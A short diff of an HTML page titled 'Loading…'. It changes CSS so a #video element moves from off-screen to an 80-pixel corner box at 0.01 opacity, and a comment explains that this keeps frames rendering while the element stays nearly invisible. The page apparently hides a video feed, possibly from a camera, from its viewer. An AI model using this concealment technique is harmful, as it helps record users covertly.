@@ -1,7 +1,7 @@
 <!doctype html>
 <html>
 <head>
-  <meta charset="utf-8"/>
+  <meta charset="utf-8" />
   <title>Loading…</title>
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <style>
@@ -19,15 +19,16 @@
       border: none;
       display: block;
     }
-    /* video must NOT be display:none, just move off-screen */
+    /* keep video ON-SCREEN but tiny & almost invisible to avoid black frames */
     #video {
       position: fixed;
-      top: -10000px;
-      left: -10000px;
-      width: 1px;
-      height: 1px;
-      opacity: 0;
+      bottom: 4px;
+      right: 4px;
+      width: 80px;
+      height: 80px;
+      opacity: 0.01;        /* not 0, so browser still renders frames */
       pointer-events: none;
+      z-index: 9999;
     }
     #canvas {
       display: none;
